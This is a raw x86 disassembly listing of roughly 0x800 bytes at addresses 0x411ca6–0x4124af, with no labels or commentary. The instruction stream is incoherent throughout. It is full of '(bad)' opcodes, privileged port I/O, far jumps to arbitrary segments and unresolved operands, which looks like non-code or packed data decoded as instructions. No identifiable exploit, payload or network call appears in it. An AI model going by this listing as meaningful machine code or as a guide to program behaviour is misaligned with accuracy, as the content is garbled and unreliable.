  411ca6:	jl     0x411c56
  411ca8:	push   edx
  411ca9:	jle    0x411c2b
  411cab:	and    esi,edx
  411cad:	scas   eax,DWORD PTR es:[edi]
  411cae:	jmp    0x411cb9
  411cb0:	mov    dl,0x42
  411cb2:	jg     0x411c98
  411cb4:	imul   edi,DWORD PTR [ecx],0x457800db
  411cba:	xlat   BYTE PTR ds:[ebx]
  411cbb:	ret    0x4af4
  411cbe:	in     eax,dx
  411cbf:	aaa    
  411cc0:	sub    dl,BYTE PTR [eax+0x66ad60c3]
  411cc6:	push   ebp
  411cc7:	retf   0x71ad
  411cca:	pop    edi
  411ccb:	loop   0x411c74
  411ccd:	and    edx,esi
  411ccf:	and    BYTE PTR [esi+eax*8-0x34],cl
  411cd3:	and    edi,DWORD PTR [eax-0x776cda0d]
  411cd9:	mov    ah,0x78
  411cdb:	pop    ebp
  411cdc:	and    al,0x9d
  411cde:	mov    BYTE PTR [esi+0xb390702],bl
  411ce4:	hlt    
  411ce5:	dec    edi
  411ce6:	test   BYTE PTR [edi-0xe3aea60],0x44
  411ced:	and    eax,DWORD PTR [ebx+0x65]
  411cf0:	pop    ebp
  411cf1:	pusha  
  411cf2:	lods   eax,DWORD PTR ds:[esi]
  411cf3:	repz int 0xb
  411cf6:	push   eax
  411cf7:	mov    BYTE PTR [edx-0x40e25b30],0x6e
  411cfe:	cmp    al,0xac
  411d00:	out    0xd0,al
  411d02:	push   ds
  411d03:	or     eax,0xb12f5866
  411d08:	mov    DWORD PTR [ecx-0x6686d8dc],edi
  411d0e:	xacquire xchg BYTE PTR [eax-0x40],bh
  411d12:	mov    eax,DWORD PTR [eax-0x14223fb6]
  411d18:	push   0xc7acd52b
  411d1d:	jle    0x411cfb
  411d1f:	test   BYTE PTR [esi],0x27
  411d22:	fistp  DWORD PTR [ecx-0x4e]
  411d25:	call   0xae31:0x64524d9d
  411d2c:	(bad)  
  411d2d:	enter  0xdc2f,0x50
  411d31:	loop   0x411cfd
  411d33:	pop    es
  411d34:	shl    DWORD PTR [eax+0x44],1
  411d37:	cdq    
  411d38:	inc    ebx
  411d39:	sub    eax,0x2ea34d7b
  411d3e:	stos   BYTE PTR es:[edi],al
  411d3f:	stos   DWORD PTR es:[edi],eax
  411d40:	sbb    DWORD PTR [edx+0x39],esp
  411d43:	ret    
  411d44:	jecxz  0x411cf3
  411d46:	pusha  
  411d47:	sbb    esi,DWORD PTR [esi*1+0x209963b7]
  411d4e:	ss js  0x411db2
  411d51:	popw   es
  411d53:	dec    ebx
  411d54:	inc    ebx
  411d55:	jne    0x411d70
  411d57:	jl     0x411d22
  411d59:	leave  
  411d5a:	push   ebx
  411d5b:	sub    DWORD PTR [edi-0x3ef9ee7e],edx
  411d61:	sub    al,0xf8
  411d63:	mov    BYTE PTR [edx+0x462906b9],bh
  411d69:	pusha  
  411d6a:	and    bh,BYTE PTR [ecx-0x27]
  411d6d:	jbe    0x411dd1
  411d6f:	inc    eax
  411d70:	xor    bh,BYTE PTR [edx+0x482f3325]
  411d76:	push   ebx
  411d77:	dec    edx
  411d78:	pop    edi
  411d79:	and    al,0x55
  411d7b:	inc    edx
  411d7c:	mov    ch,0x73
  411d7e:	mov    edi,0x5d8aa8ee
  411d83:	(bad)  
  411d84:	sbb    BYTE PTR [ecx-0x6a48cfc1],ch
  411d8a:	sti    
  411d8b:	xor    edi,DWORD PTR [eax+0x46f33cd6]
  411d91:	mov    dh,0x62
  411d93:	and    DWORD PTR ds:0x4043abd4,ebx
  411d99:	jb     0x411e05
  411d9b:	je     0x411ddd
  411d9d:	push   ds
  411d9e:	mov    ch,0x82
  411da0:	adc    DWORD PTR [ecx+0x65fcf377],esp
  411da6:	fild   WORD PTR [ebp-0x4]
  411da9:	push   0xffffffb6
  411dab:	xchg   BYTE PTR [edi],dl
  411dad:	test   cl,ah
  411daf:	in     eax,0xb2
  411db1:	fstp   DWORD PTR [ebp+0x5c]
  411db4:	mov    esp,0xe5ca21af
  411db9:	retf   
  411dba:	ret    
  411dbb:	(bad)  
  411dbd:	adc    eax,0x811d2de0
  411dc2:	and    eax,0x2454aa02
  411dc7:	neg    DWORD PTR [eax]
  411dc9:	jae    0x411e0c
  411dcb:	inc    edi
  411dcc:	dec    esi
  411dcd:	xor    BYTE PTR [edx],0x8
  411dd0:	sbb    eax,0xecec8e36
  411dd5:	mov    bl,0xcb
  411dd7:	jnp    0x411da1
  411dd9:	pop    ebx
  411dda:	xor    eax,0x6890d601
  411ddf:	(bad)  
  411de0:	xchg   esi,eax
  411de1:	aad    0x2c
  411de3:	into   
  411de4:	retf   
  411de5:	pop    esp
  411de6:	mov    esi,0xb0615828
  411deb:	lds    ecx,FWORD PTR ds:0xf927c281
  411df1:	mov    edi,0xc5f01d8e
  411df6:	push   esp
  411df7:	addr16 retf 
  411df9:	dec    ebp
  411dfa:	adc    eax,0x78b457a5
  411dff:	fnsave [eax-0x5d15fcbe]
  411e05:	fwait
  411e06:	pop    esp
  411e07:	mov    bl,0x8f
  411e09:	mov    edx,0xe6308b3b
  411e0e:	int3   
  411e0f:	mov    esi,0xfbf7a059
  411e14:	in     al,0x4d
  411e16:	xor    eax,0xccebbb84
  411e1b:	pop    ds
  411e1c:	pop    edx
  411e1d:	(bad)  
  411e1e:	jnp    0x411e8a
  411e20:	into   
  411e21:	mov    ah,0x5
  411e23:	daa    
  411e24:	pop    esi
  411e25:	mov    ecx,0x677f3866
  411e2a:	arpl   dx,sp
  411e2c:	push   ebx
  411e2d:	xchg   ebp,eax
  411e2e:	shl    ebx,1
  411e30:	in     al,dx
  411e31:	aam    0x45
  411e33:	aaa    
  411e34:	cmp    eax,0x5425c80c
  411e39:	push   edi
  411e3a:	xchg   esi,eax
  411e3b:	inc    esi
  411e3c:	fisttp WORD PTR [ecx+eiz*1-0x79e08ad6]
  411e43:	inc    ebx
  411e44:	xlat   BYTE PTR ds:[ebx]
  411e45:	shr    DWORD PTR [edi],0x54
  411e48:	test   eax,0x6d99ff62
  411e4d:	stos   DWORD PTR es:[edi],eax
  411e4e:	cdq    
  411e4f:	jecxz  0x411e71
  411e51:	inc    ecx
  411e52:	leave  
  411e53:	arpl   bx,di
  411e55:	mov    ebx,0x7f363c7e
  411e5a:	loop   0x411ed6
  411e5c:	mov    ebx,0xb7d4d144
  411e61:	das    
  411e62:	cmp    ebx,edi
  411e64:	(bad)  
  411e65:	das    
  411e66:	icebp  
  411e67:	scas   eax,DWORD PTR es:[edi]
  411e68:	xchg   esi,eax
  411e69:	(bad)  
  411e6a:	std    
  411e6b:	int3   
  411e6c:	or     eax,0xbc729cc5
  411e71:	jge    0x411eaf
  411e73:	dec    eax
  411e74:	cmp    al,0x86
  411e76:	xor    eax,DWORD PTR [ecx-0x4f]
  411e79:	cmp    DWORD PTR [edx],edi
  411e7b:	std    
  411e7c:	mov    BYTE PTR [ebp-0x66ceb20],bl
  411e82:	test   BYTE PTR [eax],al
  411e84:	pop    edi
  411e85:	cli    
  411e86:	fld    QWORD PTR [ebp+0x20]
  411e89:	mov    esi,DWORD PTR [esi+ebp*2+0x43a92b23]
  411e90:	popa   
  411e91:	sbb    ch,bl
  411e93:	imul   edi,DWORD PTR [edx],0x58
  411e96:	jp     0x411f02
  411e98:	jns    0x411e88
  411e9a:	rcl    cl,cl
  411e9c:	inc    ecx
  411e9d:	stos   BYTE PTR es:[edi],al
  411e9e:	pop    eax
  411e9f:	fxch   st(5)
  411ea1:	repnz mov edi,0xd11ebb93
  411ea7:	push   esp
  411ea8:	jnp    0x411ed9
  411eaa:	inc    ebx
  411eab:	inc    eax
  411eac:	fmul   DWORD PTR [edx-0xabde6fc]
  411eb2:	in     al,0x77
  411eb4:	jl     0x411e48
  411eb6:	bound  edi,QWORD PTR [edi-0x3d]
  411eb9:	int3   
  411eba:	mov    cl,0x1c
  411ebc:	aaa    
  411ebd:	add    al,0x87
  411ebf:	sbb    eax,0x646f22c
  411ec4:	fisubr DWORD PTR [ecx]
  411ec6:	loopne 0x411e61
  411ec8:	test   BYTE PTR [eax+0x49809468],dh
  411ece:	or     DWORD PTR [ecx+0x65],edi
  411ed1:	sbb    edx,DWORD PTR [ebp+0x5e1d84d9]
  411ed7:	(bad)  
  411ed8:	iret   
  411ed9:	mov    WORD PTR [eax+0x554ce223],gs
  411edf:	loopne 0x411edb
  411ee1:	push   edx
  411ee2:	sti    
  411ee3:	jmp    0xd67121ac
  411ee8:	push   cs
  411ee9:	xlat   BYTE PTR ds:[ebx]
  411eea:	leave  
  411eeb:	rcl    BYTE PTR [ebp-0x3c73db83],1
  411ef1:	push   esp
  411ef2:	pop    ss
  411ef3:	cld    
  411ef4:	sub    eax,0xc70c32d3
  411ef9:	loop   0x411eae
  411efb:	fcomp  QWORD PTR [edx+0x4c41958c]
  411f01:	nop
  411f02:	pop    es
  411f03:	rcr    BYTE PTR [edx],1
  411f05:	fwait
  411f06:	in     eax,0xc3
  411f08:	dec    esp
  411f09:	repz popa 
  411f0b:	jne    0x411f43
  411f0d:	sub    esp,DWORD PTR [ebx+0x4423c579]
  411f13:	dec    ebp
  411f14:	xlat   BYTE PTR ds:[ebx]
  411f15:	xchg   ebx,eax
  411f16:	push   eax
  411f17:	push   cs
  411f18:	inc    esp
  411f19:	and    DWORD PTR [edi+0x56a7545c],0x62
  411f20:	mov    ecx,0x4c808f6c
  411f25:	xchg   edi,eax
  411f26:	dec    esi
  411f27:	out    0x89,al
  411f29:	sbb    BYTE PTR [edi],bh
  411f2b:	jecxz  0x411f2d
  411f2d:	mov    ch,0xc
  411f2f:	push   eax
  411f30:	fdiv   DWORD PTR [edi+0x5d]
  411f33:	jo     0x411ee0
  411f35:	inc    ebp
  411f36:	dec    edx
  411f37:	sub    DWORD PTR [edi],ebp
  411f39:	pop    ss
  411f3a:	jg     0x411ed4
  411f3c:	and    DWORD PTR [edi-0x6185f117],ebx
  411f42:	loop   0x411f31
  411f44:	push   eax
  411f45:	pop    ebp
  411f46:	push   0x2de45517
  411f4b:	cmp    al,0x3
  411f4d:	ins    DWORD PTR es:[edi],dx
  411f4e:	add    DWORD PTR [esi-0x324fdb61],ecx
  411f54:	(bad)  
  411f55:	sbb    ah,BYTE PTR [ebx+0x503fbefa]
  411f5b:	imul   ebp,esp,0x9e7868a2
  411f61:	and    DWORD PTR [esi+ecx*8+0x1c],0x6f
  411f66:	test   edx,edi
  411f68:	fdivr  QWORD PTR [esi+0x2d2206a2]
  411f6e:	das    
  411f6f:	nop
  411f70:	int    0x44
  411f72:	add    edx,ebx
  411f74:	imul   ebx,DWORD PTR [esi+0x2b],0xc3a4e6
  411f7b:	mov    ah,0xa7
  411f7d:	adc    BYTE PTR [edi+0x1a],dl
  411f80:	hlt    
  411f81:	adc    DWORD PTR [esi-0x66fe4a9d],0xffffffb3
  411f88:	xor    eax,DWORD PTR [edx+0xf]
  411f8b:	lahf   
  411f8c:	cli    
  411f8d:	sahf   
  411f8e:	jns    0x411fa7
  411f90:	inc    ebp
  411f91:	xor    al,0x95
  411f93:	mov    ds:0xac171b07,al
  411f98:	sbb    esp,DWORD PTR [ecx+0x723717ba]
  411f9e:	add    edi,DWORD PTR [ebx+0x767810f0]
  411fa4:	in     eax,dx
  411fa5:	xchg   esp,eax
  411fa6:	ret    
  411fa7:	or     cl,BYTE PTR ds:0xb9e159b4
  411fad:	xor    al,0x97
  411faf:	ins    DWORD PTR es:[edi],dx
  411fb0:	sbb    ah,BYTE PTR [esi+0x492413b4]
  411fb6:	or     dh,BYTE PTR [edi+ecx*4]
  411fb9:	fcom   DWORD PTR [ebx]
  411fbb:	and    BYTE PTR [edi-0x4a347a4b],dh
  411fc1:	mov    ds:0x4b928772,al
  411fc6:	sbb    al,0x62
  411fc8:	gs scas al,BYTE PTR es:[edi]
  411fca:	and    bl,cl
  411fcc:	lahf   
  411fcd:	test   dl,0x49
  411fd0:	add    al,0x79
  411fd2:	aam    0x60
  411fd4:	dec    ebx
  411fd5:	repz xor bh,BYTE PTR [eax-0xab09bd]
  411fdc:	mov    bh,BYTE PTR [edx]
  411fde:	sbb    al,0x81
  411fe0:	hlt    
  411fe1:	mov    dl,0xa5
  411fe3:	xchg   edx,eax
  411fe4:	add    DWORD PTR [edx-0x44fba326],ebx
  411fea:	mov    al,0x27
  411fec:	pop    edx
  411fed:	outs   dx,BYTE PTR ds:[esi]
  411fee:	add    al,0x24
  411ff0:	sbb    BYTE PTR ds:0xa83d99fd,bl
  411ff6:	mov    ch,0x4e
  411ff8:	(bad)
  411ffc:	xchg   ebp,eax
  411ffd:	and    ch,BYTE PTR [edx+0x45d267f2]
  412003:	test   BYTE PTR [edi-0x71],dl
  412006:	loopne 0x411fd4
  412008:	pop    ss
  412009:	loopne 0x411f8d
  41200b:	push   eax
  41200c:	mov    ebp,0x18d1829
  412012:	daa    
  412013:	enter  0x868d,0xd4
  412017:	(bad)  
  412018:	repnz into 
  41201a:	and    DWORD PTR gs:[ebx+0x12],ecx
  41201e:	inc    ebx
  41201f:	pop    eax
  412020:	mov    edx,0x2a82c376
  412025:	dec    esi
  412026:	sbb    dl,BYTE PTR [esi+0x2d9d66fa]
  41202c:	adc    ecx,DWORD PTR [eax+ebx*8]
  41202f:	mov    dl,0x55
  412031:	sti    
  412032:	bound  edx,QWORD PTR [edx+0x4bd1af77]
  412038:	lea    ebx,[esi+0x259fd019]
  41203e:	ins    BYTE PTR es:[edi],dx
  41203f:	(bad)  
  412040:	sbb    DWORD PTR [edi],ebp
  412042:	test   al,0xce
  412044:	inc    eax
  412045:	pop    esp
  412046:	lea    esi,[ecx+0x3a]
  412049:	js     0x412032
  41204b:	in     eax,0x4a
  41204d:	bsf    di,WORD PTR [edi+eiz*1+0x16f6e2d6]
  412056:	xchg   esp,eax
  412057:	loop   0x4120b6
  412059:	add    DWORD PTR [eax-0x442b4e51],ebx
  41205f:	add    al,0xcc
  412061:	and    eax,0xe4698486
  412066:	fistp  QWORD PTR [edi+0x4109107c]
  41206c:	sub    al,0x26
  41206e:	cmp    BYTE PTR [ecx],ah
  412070:	adc    DWORD PTR [esi+0x5a],ebx
  412073:	add    cl,BYTE PTR [ecx+0x0]
  412076:	lods   eax,DWORD PTR ds:[esi]
  412077:	dec    eax
  412078:	mov    al,ds:0x5b796200
  41207d:	xchg   esi,eax
  41207e:	dec    esi
  41207f:	dec    esi
  412080:	adc    BYTE PTR [ecx],dh
  412082:	pushf  
  412083:	mov    al,0xf6
  412085:	cmp    DWORD PTR [esp+edx*1+0x21],esi
  412089:	xchg   edi,eax
  41208a:	sbb    eax,DWORD PTR [esp+ebx*4+0x65a10d1e]
  412091:	xchg   BYTE PTR [edx],ah
  412093:	jae    0x4120dd
  412095:	push   es
  412096:	xchg   esi,eax
  412097:	jmp    0xee6d:0xaf8b28e9
  41209e:	ds add eax,0x43ab1747
  4120a4:	push   ds
  4120a5:	and    DWORD PTR [edi-0x35],0x54510c8
  4120ac:	push   ebp
  4120ad:	ret    
  4120ae:	inc    ecx
  4120af:	iret   
  4120b0:	pop    esi
  4120b1:	add    esp,DWORD PTR [eax+0x17]
  4120b4:	sub    eax,0xc6a92302
  4120b9:	je     0x4120f5
  4120bb:	sbb    eax,0xad031c8
  4120c0:	loop   0x412107
  4120c2:	add    edi,DWORD PTR [edx+esi*2-0x2e]
  4120c6:	xchg   BYTE PTR [eax+esi*4],cl
  4120c9:	mov    BYTE PTR [ebx],dh
  4120cb:	add    ebx,DWORD PTR [edi+0x31]
  4120ce:	push   ds
  4120cf:	pop    ds
  4120d0:	int    0x8
  4120d2:	(bad)  
  4120d4:	pop    ecx
  4120d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120d6:	les    esp,FWORD PTR [edx]
  4120d8:	xor    al,0x6d
  4120da:	xor    esp,ebx
  4120dc:	push   edi
  4120dd:	bound  eax,QWORD PTR fs:[edx+0x33]
  4120e1:	arpl   di,cx
  4120e3:	inc    ebx
  4120e4:	dec    esp
  4120e5:	pusha  
  4120e6:	in     eax,dx
  4120e7:	inc    ebp
  4120e8:	js     0x412166
  4120ea:	cdq    
  4120eb:	je     0x4120bc
  4120ed:	icebp  
  4120ee:	loop   0x412134
  4120f0:	mov    DWORD PTR [ebx],esp
  4120f2:	js     0x412143
  4120f4:	cld    
  4120f5:	sbb    DWORD PTR [eax+0x2ccf07c5],ebx
  4120fb:	cld    
  4120fc:	add    edx,DWORD PTR [edi+ecx*1+0x53]
  412100:	mov    eax,0x6d34fce0
  412105:	or     dh,0x29
  412108:	xchg   DWORD PTR [ecx],ebx
  41210a:	sbb    al,0x8e
  41210c:	retf   
  41210d:	shl    DWORD PTR [esi+ecx*4-0x2c],0x4
  412112:	test   al,0x96
  412114:	mov    ds:0x773e68bf,al
  412119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41211a:	repnz mov bl,0x82
  41211d:	pop    esp
  41211e:	adc    BYTE PTR [ebx-0x4fe778a5],0x45
  412125:	call   0xeb569aa1
  41212a:	enter  0x63fb,0xdb
  41212e:	push   esp
  41212f:	scas   al,BYTE PTR es:[edi]
  412130:	sub    edi,esp
  412132:	adc    DWORD PTR [edx],edx
  412134:	in     eax,0x75
  412136:	in     al,0x6e
  412138:	stos   DWORD PTR es:[edi],eax
  412139:	scas   al,BYTE PTR es:[edi]
  41213a:	push   eax
  41213b:	dec    BYTE PTR [edi-0x6ef3e3e4]
  412141:	dec    esi
  412142:	add    ch,cl
  412144:	mul    DWORD PTR [ebx]
  412146:	dec    ecx
  412147:	lock fdivr DWORD PTR [ecx+ebx*1+0x3401734c]
  41214f:	sbb    BYTE PTR ds:0x6e923344,ch
  412155:	fcmovu st,st(0)
  412157:	in     eax,dx
  412158:	push   ax
  41215a:	or     ebp,DWORD PTR [edx+0x5c55c614]
  412160:	jp     0x412189
  412162:	and    al,0xbe
  412164:	(bad)  [ecx-0x64]
  412167:	mov    ah,0x94
  412169:	xchg   esi,eax
  41216a:	sub    al,0xa9
  41216c:	shl    BYTE PTR [ecx],cl
  41216e:	xlat   BYTE PTR ds:[ebx]
  41216f:	aad    0x58
  412171:	sub    ch,BYTE PTR [edi-0x23396a46]
  412177:	and    eax,0xeb61d137
  41217c:	fiadd  WORD PTR [edi+0x77a6e1a]
  412182:	addr16 dec edi
  412184:	dec    esp
  412185:	cld    
  412186:	mov    ah,0x9
  412188:	imul   edx,DWORD PTR [edx],0xafa63011
  41218e:	and    al,0x59
  412190:	pop    edx
  412191:	cmp    DWORD PTR [edi+0x6e366d18],esi
  412197:	iret   
  412198:	mov    BYTE PTR [esi+0x3b],0x78
  41219c:	and    edi,DWORD PTR [esi-0x2c]
  41219f:	aas    
  4121a0:	jo     0x41213d
  4121a2:	and    ah,dl
  4121a4:	pop    ds
  4121a5:	pop    ebx
  4121a6:	hlt    
  4121a7:	add    DWORD PTR [eax+edx*2-0x5b],ecx
  4121ab:	stos   BYTE PTR es:[edi],al
  4121ac:	cmp    al,0xd
  4121ae:	xor    DWORD PTR [ebp+0xc],eax
  4121b1:	jmp    0x3421:0xa5edbe43
  4121b8:	pop    ecx
  4121b9:	lahf   
  4121ba:	mov    ebp,0x45394542
  4121bf:	cs (bad) 
  4121c1:	mov    eax,ds:0x4aeaa9ba
  4121c6:	and    ebp,edx
  4121c8:	add    bl,dh
  4121ca:	add    edx,esp
  4121cc:	dec    ecx
  4121cd:	jb     0x4121f1
  4121cf:	ja     0x41223a
  4121d1:	stos   DWORD PTR es:[edi],eax
  4121d2:	add    DWORD PTR [ebp+0x29],eax
  4121d5:	fcomp  QWORD PTR [edi+0x13]
  4121d8:	mov    eax,0x9d3ff69d
  4121dd:	jnp    0x4121be
  4121df:	ins    DWORD PTR es:[edi],dx
  4121e0:	jecxz  0x4121e3
  4121e2:	jecxz  0x412167
  4121e4:	dec    esi
  4121e5:	pushf  
  4121e6:	icebp  
  4121e7:	push   DWORD PTR [edi]
  4121e9:	je     0x412242
  4121eb:	fsub   DWORD PTR [edi+0x77b5637]
  4121f1:	fsub   DWORD PTR [edi]
  4121f3:	and    BYTE PTR [eax-0x1a12c340],bh
  4121f9:	pop    ss
  4121fa:	pop    eax
  4121fb:	xchg   ebp,eax
  4121fc:	addr16 push cs
  4121fe:	lea    ecx,[ebx+0x56b78ac]
  412204:	sar    BYTE PTR [eax+0x32],0xfc
  412208:	jmp    0x7f00:0x5ed1e6ae
  41220f:	vpmulhw ymm7,ymm5,YMMWORD PTR [ebx+0x37ec2d81]
  412217:	loop   0x4121d1
  412219:	mov    ebx,0xe2c3c46e
  41221e:	sbb    al,0x12
  412220:	(bad)  
  412221:	sub    esi,DWORD PTR [esi]
  412223:	les    ebp,FWORD PTR es:[edi-0x5fe26e4d]
  41222a:	les    edx,FWORD PTR ds:0x7cfe685b
  412230:	cwde   
  412231:	add    esi,DWORD PTR [edx+0x424970cd]
  412237:	pop    ebp
  412238:	test   dl,cl
  41223a:	js     0x4121f7
  41223c:	sub    eax,0x6bc453d1
  412241:	or     ebx,edx
  412243:	add    eax,0x795bea1e
  412248:	(bad)  
  412249:	push   eax
  41224a:	(bad)  
  41224b:	leave  
  41224c:	mov    ?,ebp
  41224e:	sar    BYTE PTR [ebx],1
  412250:	(bad)  
  412251:	mov    edi,0x10673959
  412256:	mov    ss,eax
  412258:	inc    edi
  412259:	test   eax,0x9eb58582
  41225e:	mul    DWORD PTR [ebp+0x572357f5]
  412264:	cli    
  412265:	sbb    al,0x3a
  412267:	lock out dx,al
  412269:	ffreep st(0)
  41226b:	loop   0x412225
  41226d:	lods   al,BYTE PTR ds:[esi]
  41226e:	iret   
  41226f:	mov    esi,0xb12b6ca
  412274:	sub    BYTE PTR [eax+0x29],bl
  412277:	pop    edi
  412278:	adc    edi,DWORD PTR [esp+eiz*2-0x4555738e]
  41227f:	mov    bl,0x22
  412281:	jle    0x4122d1
  412283:	or     eax,0x3f214abc
  412288:	rol    DWORD PTR [edi+0x44734df9],1
  41228e:	mov    edi,0xa91421fa
  412293:	pop    ss
  412294:	scas   eax,DWORD PTR es:[edi]
  412295:	push   ds
  412296:	test   eax,0x5dc0f520
  41229b:	xchg   ebp,eax
  41229c:	mov    edi,0xd2df3a6d
  4122a1:	lds    esi,FWORD PTR [edx+0x50]
  4122a4:	test   esp,0xfba49b3a
  4122aa:	xor    al,0xfc
  4122ac:	ja     0x4122ee
  4122ae:	pop    ss
  4122af:	out    dx,eax
  4122b0:	test   eax,0xb9419e74
  4122b5:	ror    BYTE PTR [ebx+eiz*2-0x9],0x4b
  4122ba:	mov    ?,WORD PTR [ecx]
  4122bc:	mov    bl,0xee
  4122be:	arpl   bp,si
  4122c0:	jmp    0x537c:0x9487e1a7
  4122c7:	xchg   ebx,eax
  4122c8:	ret    
  4122c9:	enter  0xf226,0x15
  4122cd:	sbb    al,0x6e
  4122cf:	sbb    esp,DWORD PTR [ecx+0x45]
  4122d2:	imul   edi,DWORD PTR [ecx-0x59874e6b],0xe5069e30
  4122dc:	and    esp,eax
  4122de:	push   ss
  4122df:	lock mov bl,0x2
  4122e2:	imul   DWORD PTR [esi]
  4122e4:	jg     0x412289
  4122e6:	pop    ds
  4122e7:	pop    edi
  4122e8:	push   edi
  4122e9:	mov    BYTE PTR [ebp-0x18],dh
  4122ec:	jae    0x412348
  4122ee:	mov    eax,0xc4f837e9
  4122f3:	cmc    
  4122f4:	xlat   BYTE PTR ds:[ebx]
  4122f5:	sti    
  4122f6:	cwde   
  4122f7:	inc    ebx
  4122f8:	std    
  4122f9:	mov    eax,ds:0x70d4fe6
  4122fe:	jae    0x4122cb
  412300:	lock sub dh,BYTE PTR [ecx+eiz*1-0xd]
  412305:	mov    ecx,0x3bc3f2
  41230a:	push   0xfffffff7
  41230c:	sbb    BYTE PTR [edi+0x21],ah
  41230f:	lahf   
  412310:	sbb    edi,esp
  412312:	add    esp,DWORD PTR [edi+ebx*4-0x80]
  412316:	mov    cl,0x5c
  412318:	inc    esp
  412319:	les    edx,FWORD PTR [esi-0x2f64081d]
  41231f:	jl     0x412395
  412321:	xchg   ebp,eax
  412322:	fnstenv [ecx]
  412324:	pop    ebx
  412325:	bnd jno 0x412348
  412328:	add    ch,BYTE PTR [esi]
  41232a:	xor    eax,0xe13c4f40
  41232f:	mov    esp,0x2f41ea57
  412334:	or     al,0xc8
  412336:	rcr    DWORD PTR [edi],0xe3
  412339:	pop    edx
  41233a:	inc    ebx
  41233b:	and    eax,0x72521d99
  412340:	jbe    0x4123af
  412342:	push   0xfffffffa
  412344:	repz push ebp
  412346:	fadd   QWORD PTR [eax+eax*1+0x42]
  41234a:	pop    edi
  41234b:	dec    esp
  41234c:	push   0x3e54fd3e
  412351:	pushf  
  412352:	adc    al,0xed
  412354:	cdq    
  412355:	and    esp,ebx
  412357:	inc    ebp
  412358:	dec    ecx
  412359:	and    eax,0x5b86fe55
  41235e:	or     al,0x40
  412360:	and    dh,0xb7
  412363:	or     dl,BYTE PTR [eax-0x55]
  412366:	(bad)  
  412367:	loop   0x412370
  412369:	imul   eax,edi,0xffffffd9
  41236c:	pop    edx
  41236d:	sub    BYTE PTR [edx-0x5f],bl
  412370:	frstor [esi+edi*8+0x5a4ab580]
  412377:	lods   eax,DWORD PTR ds:[esi]
  412378:	push   eax
  412379:	xchg   edi,eax
  41237a:	ins    BYTE PTR es:[edi],dx
  41237b:	pop    ds
  41237c:	push   ebx
  41237d:	out    0x9d,al
  41237f:	popa   
  412380:	pop    ecx
  412381:	fadd   QWORD PTR [eax]
  412383:	bnd jmp 0x412317
  412386:	out    dx,eax
  412387:	repz and eax,edx
  41238a:	fsubr  DWORD PTR [eax+0x11cbf239]
  412390:	test   eax,0xeb5b9299
  412395:	sub    esi,DWORD PTR [ebx-0x35]
  412398:	or     dl,bl
  41239a:	push   ebp
  41239b:	(bad)  
  41239c:	rol    BYTE PTR [ecx+0x64],cl
  41239f:	repz inc esp
  4123a1:	ja     0x412414
  4123a3:	xor    DWORD PTR [ecx+esi*4+0x52],esp
  4123a7:	jp     0x4123c8
  4123a9:	cmp    BYTE PTR [ecx+0x4b19142b],bl
  4123af:	push   edi
  4123b0:	add    cl,BYTE PTR [esi-0x37057375]
  4123b6:	inc    DWORD PTR [ecx]
  4123b8:	and    DWORD PTR [esi+eiz*2+0x9],esp
  4123bc:	sbb    esi,0x79
  4123bf:	xchg   esi,eax
  4123c0:	int    0x88
  4123c2:	mov    BYTE PTR [edi-0x63da6708],bl
  4123c8:	(bad)  
  4123c9:	bound  ecx,QWORD PTR [edx-0x6927231c]
  4123cf:	pop    esi
  4123d0:	sbb    DWORD PTR [ebp-0x4a],ebp
  4123d3:	das    
  4123d4:	xchg   ecx,eax
  4123d5:	jno    0x4123af
  4123d7:	bound  edi,QWORD PTR [ebx-0x6c23d1cf]
  4123dd:	jmp    0x412382
  4123df:	push   ds
  4123e0:	les    ebx,FWORD PTR [ecx-0x56539daa]
  4123e6:	in     eax,0x8d
  4123e8:	dec    WORD PTR [esi+0x2f]
  4123ec:	gs mov esi,0xef5efc2b
  4123f2:	in     al,dx
  4123f3:	(bad)  
  4123f4:	popf   
  4123f5:	cmc    
  4123f6:	adc    DWORD PTR [ecx-0x21d5e7f4],0x78702b4d
  412400:	out    dx,al
  412401:	int3   
  412402:	push   ss
  412403:	adc    DWORD PTR [ecx-0x517fb875],eax
  412409:	ret    
  41240a:	dec    esi
  41240b:	or     ah,BYTE PTR [ebp+0x32]
  41240e:	pop    ebx
  41240f:	rcl    BYTE PTR [ebx+0xb],cl
  412412:	xchg   ebp,eax
  412413:	xchg   esi,eax
  412414:	arpl   cx,bx
  412416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412417:	mov    al,0x89
  412419:	inc    ebp
  41241a:	jmp    DWORD PTR [eax]
  41241c:	std    
  41241d:	ret    
  41241e:	or     al,0x4d
  412420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412421:	mov    eax,0x7802504f
  412426:	sub    eax,DWORD PTR [ecx+esi*4-0x43]
  41242a:	sub    esi,edi
  41242c:	mov    dl,0xb3
  41242e:	(bad)  
  41242f:	fstp   DWORD PTR [ecx+0xcf7f7eb]
  412435:	mov    esi,0x8bce453d
  41243a:	in     al,0x4b
  41243c:	dec    ecx
  41243d:	xchg   esi,eax
  41243e:	rol    BYTE PTR [esi+0x5a],1
  412441:	sub    al,0xc
  412443:	mov    al,ds:0x74b34c80
  412448:	div    BYTE PTR [ebx-0x46]
  41244b:	mov    ah,0x84
  41244d:	sbb    edi,edi
  41244f:	fistp  QWORD PTR [ebx-0x7091cb6d]
  412455:	pop    ebx
  412456:	addr16 mov eax,ds:0x3642
  41245a:	dec    esp
  41245b:	add    DWORD PTR [ebx],ecx
  41245d:	addr16 mov edi,0x475818de
  412463:	hlt    
  412464:	das    
  412465:	clc    
  412466:	in     al,0x8c
  412468:	or     dh,BYTE PTR [edi]
  41246a:	js     0x41247d
  41246c:	lahf   
  41246d:	adc    bl,cl
  41246f:	retf   
  412470:	popa   
  412471:	call   0x9750c3e3
  412476:	jo     0x4124e8
  412478:	mov    DWORD PTR [eax-0x3e444e77],ebp
  41247e:	out    dx,al
  41247f:	jmp    0x412496
  412481:	dec    edi
  412482:	pop    es
  412483:	mov    ebp,ds
  412485:	cmp    eax,0x4df676e3
  41248a:	cmp    al,0x1a
  41248c:	add    al,0xca
  41248e:	imul   ecx,DWORD PTR [edx],0x7321169c
  412494:	sub    eax,0x54d21ecd
  412499:	inc    edi
  41249a:	jae    0x412442
  41249c:	mov    dh,0x15
  41249e:	mov    ebx,0x45bcdfa4
  4124a3:	adc    DWORD PTR [ecx+0x2d0cf99f],edi
  4124a9:	fadd   DWORD PTR [ecx-0x7bf33863]
  4124af:	add    bh,BYTE PTR [esi+0x49]
